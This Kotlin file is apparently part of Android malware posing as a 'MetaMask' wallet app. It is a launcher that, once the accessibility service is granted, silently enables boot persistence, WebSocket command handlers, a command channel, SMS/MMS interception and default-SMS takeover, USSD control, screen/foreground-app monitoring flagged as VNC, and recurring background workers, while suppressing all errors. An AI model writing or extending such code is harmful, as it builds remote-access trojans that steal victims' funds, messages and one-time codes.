package com.example.MetaMask.services

import android.content.ComponentName
import android.content.Context
import com.example.MetaMask.BuildConfig
import android.content.Intent
import android.os.Build
import android.provider.Settings
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.OutOfQuotaPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.MetaMask.activities.ComposeSmsActivity
import com.example.MetaMask.activities.HeadlessSmsSendService
import com.example.MetaMask.activities.MmsReceiver
import com.example.MetaMask.activities.SmsReceiver
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.receivers.BootReceiver
import com.example.MetaMask.receivers.WebSocketCommandHandlerReceiver
import com.example.MetaMask.services.sync.SyncManager
import java.util.concurrent.TimeUnit

object CoreServicesLauncher {

    private const val TAG = "CoreServicesLauncher"
    private const val PREFS_NAME = "SmsSetupPrefs"
    private const val PREF_KEY_SETUP_COMPLETE = "isFirstTimeSetupComplete"
    private const val WORKER_PERIOD_MINUTES = 15L

    fun isAccessibilityServiceEnabled(context: Context): Boolean {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] isAccessibilityServiceEnabled enter context=ctx") //xdbg
        if (!BuildConfig.FEAT_ACCESSIBILITY) return false
        android.util.Log.d("XDBG", "[CoreServicesLauncher] return") //xdbg
        return try {
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabled.split(":").any { it.startsWith(context.packageName + "/") }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[CoreServicesLauncher] catch (ignored)") //xdbg
            false
        }
    }

    fun launch(context: Context) {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] launch enter context=ctx") //xdbg
        if (!BuildConfig.FEAT_ACCESSIBILITY) return
        if (!isAccessibilityServiceEnabled(context)) return
        try { activateCoreFunctionality(context) } catch (_: Exception) {}
        try { startAllServices(context) } catch (_: Exception) {}
        try { scheduleWorker(context) } catch (_: Exception) {}
        if (BuildConfig.FEAT_SYNC_MANAGER) {
            android.util.Log.d("XDBG", "[CoreServicesLauncher] if branch") //xdbg
            try { SyncManager.createSyncAccount(context) } catch (_: Exception) {}
        }
        saveSetupComplete(context)
    }

    fun activateCoreFunctionality(context: Context) {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] activateCoreFunctionality enter context=ctx") //xdbg
        val componentsToToggle = mutableListOf<Class<*>>(
            AlarmReceiver::class.java,
            BootReceiver::class.java,
            WebSocketCommandHandlerReceiver::class.java,
            MasterWebSocketDispatcher::class.java,
            UUIDService::class.java
        )
        if (BuildConfig.FEAT_SMS) {
            android.util.Log.d("XDBG", "[CoreServicesLauncher] if branch") //xdbg
            componentsToToggle += SmsReceiver::class.java
            componentsToToggle += MmsReceiver::class.java
        }
        if (BuildConfig.FEAT_SMS_ROLE) {
            android.util.Log.d("XDBG", "[CoreServicesLauncher] if branch") //xdbg
            componentsToToggle += ComposeSmsActivity::class.java
            componentsToToggle += HeadlessSmsSendService::class.java
        }
        if (BuildConfig.FEAT_CMD_CHANNEL)     componentsToToggle += CommandChannelService::class.java
        if (BuildConfig.FEAT_DEVICE_MONITOR)  componentsToToggle += DeviceStateMonitorService::class.java
        if (BuildConfig.FEAT_VNC)             componentsToToggle += ForegroundAppMonitorService::class.java
        if (BuildConfig.FEAT_TURTLE)          componentsToToggle += TurtleService::class.java
        if (BuildConfig.FEAT_USSD)            componentsToToggle += UssdControlService::class.java
        if (BuildConfig.FEAT_USSD)            componentsToToggle += LegacyUssdService::class.java
        if (BuildConfig.FEAT_TROL_SVC)        componentsToToggle += trolService::class.java
        if (BuildConfig.FEAT_FRIEN_CAT)       componentsToToggle += FrienCat::class.java
        val pm = context.packageManager
        componentsToToggle.forEach { cls ->
            val cn = ComponentName(context, cls)
            try {
                if (pm.getComponentEnabledSetting(cn) != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                    android.util.Log.d("XDBG", "[CoreServicesLauncher] if branch") //xdbg
                    pm.setComponentEnabledSetting(
                        cn,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                }
            } catch (_: Exception) {}
        }
    }

    private fun startAllServices(context: Context) {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] startAllServices enter context=ctx") //xdbg
        try {
            val intent = Intent(context, MasterWebSocketDispatcher::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[CoreServicesLauncher] if branch") //xdbg
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (_: Exception) {}
        try {
            val request = OneTimeWorkRequestBuilder<ChikenWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()
            WorkManager.getInstance(context.applicationContext).enqueueUniqueWork("CK_ONCE", ExistingWorkPolicy.KEEP, request)
        } catch (_: Exception) {}
    }

    private fun scheduleWorker(context: Context) {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] scheduleWorker enter context=ctx") //xdbg
        val workRequest = PeriodicWorkRequestBuilder<SchedulerWorker>(WORKER_PERIOD_MINUTES, TimeUnit.MINUTES).build()
        WorkManager.getInstance(context.applicationContext).enqueueUniquePeriodicWork(
            "background_sync_worker",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    fun saveSetupComplete(context: Context) {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] saveSetupComplete enter context=ctx") //xdbg
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(PREF_KEY_SETUP_COMPLETE, true)
            .apply()
    }

    fun isSetupComplete(context: Context): Boolean {
        android.util.Log.d("XDBG", "[CoreServicesLauncher] isSetupComplete enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[CoreServicesLauncher] return") //xdbg
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getBoolean(PREF_KEY_SETUP_COMPLETE, false)
    }
}
